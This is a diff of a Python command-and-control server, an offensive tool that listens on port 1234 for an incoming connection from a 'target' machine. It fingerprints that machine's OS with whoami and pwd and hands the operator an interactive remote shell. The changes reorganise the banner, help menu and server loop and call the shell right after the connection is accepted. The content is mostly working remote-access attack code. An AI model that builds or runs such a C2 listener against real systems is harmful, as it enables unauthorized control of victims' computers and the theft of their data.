@@ -122,104 +122,6 @@ def some_process_doesnt_exists(info_list, prf_list):
 
 
 
-# Banner
-def banner():
-
-	bann = pyfiglet.figlet_format("C2 Server", font = "slant")
-	print(colored(bann, 'cyan'))
-
-	print("\r")
-	print(colored("-"*50,'cyan'))
-	print("\r")
-
-	print(colored("Created by @soumyani1", 'cyan'))
-
-	print("\n")
-
-	print(colored("~> Please feel free to reach me for some suggestions:",'yellow'))
-
-	print(colored('''
-⚪ https://www.linkedin.com/in/soumyanil-biswas/
-⚪ https://twitter.com/soumyani1
-	''', 'cyan'))
-
-	print(colored('''
-[+] Use ? (or help) command to show options\n''', 'yellow'))
-
-def help():
-
-	print(colored('''\n
-  				      +------------------------+
-  	    -:~~~~~~~~~~~~~~~~~~~~~~~~|  C&C Console Commands: |~~~~~~~~~~~~~~~~~~~~~~~~:-
-  				      +------------------------+''','green'))
-	print(colored('''\n
-		help or ?                     :    Shows available Commands 
-
-		exit                          :    To exit out from C&C Console environment
-		
-		clear 			      :    Clears the console screen
-
-		Connect or connect or CONNECT
-		(linux/windows)               :    To extablish connection and get a shell
-
-''', 'yellow'))
-	print(colored('\t -:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:-\n','green'))
-
-
-
-# C2 server function
-def server():
-
-	global ip
-	global trgt
-	global sock
-
-	
-	banner()
-
-	while True:
-
-	# Getting C2 prompt before getting shell connection
-		command = input(colored("C&C => ",'magenta' ,  attrs=['bold']))
-
-		# exiting C2 Console
-		if command == "exit":
-			exit()
-
-		elif (command == "help") or (command == "?"):
-			help()
-			continue
-			
-		elif command == "clear":
-			
-			def screen_clear():
-				os.system('cls' if os.name=='nt' else 'clear')
-			
-			screen_clear()
-
-		elif (command == "Connect") or (command == "CONNECT") or (command == "connect"):
-
-			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-
-			ip = "0.0.0.0"                              # listening on any ip, change it (if you wish to)
-			port = 1234                                 # chnage it (if you wish to)
-
-			sock.bind((ip, port))                       # binding ip and port to form a method
-			sock.listen(5)
-
-			print(colored('''
-[+] Listening For Incoming Connections''', 'green'))
-
-			trgt, ip = sock.accept()
-			print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
-			print(colored("[+] For help section, type: 'help'", 'green'))
-			print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))
-
-			break
-
-
 # Getting trgt username
 def get_prompt():
 
@@ -231,7 +133,7 @@ def get_prompt():
 	Type = recv_eff()                       # received response
 
 	if Type == 'nt':
-                # Windows OS = trgt
+		# Windows OS = trgt
 		prompt = "pwd"
 		send_eff(prompt)
 
@@ -241,7 +143,7 @@ def get_prompt():
 		return prompt
 
 	else:
-                # Linux OS = trgt
+		# Linux OS = trgt
 		prompt1 = "whoami"
 		send_eff(prompt1)
 
@@ -280,6 +182,9 @@ def shell():
 		if cmd == "exit":  # ✓
 			print(colored("\n[*] Closing connection...", 'yellow'))
 			time.sleep(2)
+
+			sock.close()                        # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
+
 			print(colored("[-] Connection Closed\n", 'red'))
 			
 			print(colored("[+] Back to C&C Console\n", 'green', attrs=['bold']))
@@ -562,15 +467,108 @@ get_pid			      :    To know the processes running on the trgt
 			print(result)
 
 
-# Getting trgt username
-def main():
-	server()
 
-	shell()                             # Getting shell for trgt
-	sock.close()                        # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
+# Banner
+def banner():
+
+	bann = pyfiglet.figlet_format("C2 Server", font = "slant")
+	print(colored(bann, 'cyan'))
+
+	print("\r")
+	print(colored("-"*50,'cyan'))
+	print("\r")
+
+	print(colored("Created by @soumyani1", 'cyan'))
+
+	print("\n")
+
+	print(colored("~> Please feel free to reach me for some suggestions:",'yellow'))
+
+	print(colored('''
+⚪ https://www.linkedin.com/in/soumyanil-biswas/
+⚪ https://twitter.com/soumyani1
+	''', 'cyan'))
+
+	print(colored('''
+[+] Use ? (or help) command to show options\n''', 'yellow'))
+
+def help():
+
+	print(colored('''
++------------------------+
+|  C&C Console Commands: |~~~~~~~~~~~~~~~~~~~~~~~~:-
++------------------------+''','green'))
+	print(colored('''
+help or ?						:    Shows available Commands 
+
+exit 							:    To exit out from C&C Console environment
+		
+clear 							:    Clears the console screen
+
+Connect or connect or CONNECT 	:    To extablish connection and get a shell
+(linux/windows)
+''', 'yellow'))
+	print(colored('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:-\n','green'))
+
+
+
+
+# C2 server function
+def server():
+
+	global ip
+	global trgt
+	global sock
+
+
+	banner()
+
+	while True:
+
+	# Getting C2 prompt before getting shell connection
+		command = input(colored("C&C => ",'magenta' ,  attrs=['bold']))
+
+		# exiting C2 Console
+		if command == "exit":
+			exit()
+
+		elif (command == "help") or (command == "?"):
+			help()
+			continue
+			
+		elif command == "clear":
+			
+			def screen_clear():
+				os.system('cls' if os.name=='nt' else 'clear')
+			
+			screen_clear()
+
+		elif (command == "Connect") or (command == "CONNECT") or (command == "connect"):
+
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+
+			ip = "0.0.0.0"                              # listening on any ip, change it (if you wish to)
+			port = 1234                                 # chnage it (if you wish to)
+
+			sock.bind((ip, port))                       # binding ip and port to form a method
+			sock.listen(5)
+
+			print(colored('''
+[+] Listening For Incoming Connections''', 'green'))
+
+			trgt, ip = sock.accept()
+			print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
+			print(colored("[+] For help section, type: 'help'", 'green'))
+			print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))
+
+			#break
+			shell()										# Getting shell for trgt
+
 
 
 if __name__ == '__main__':
-	main()
+	server()
 
 
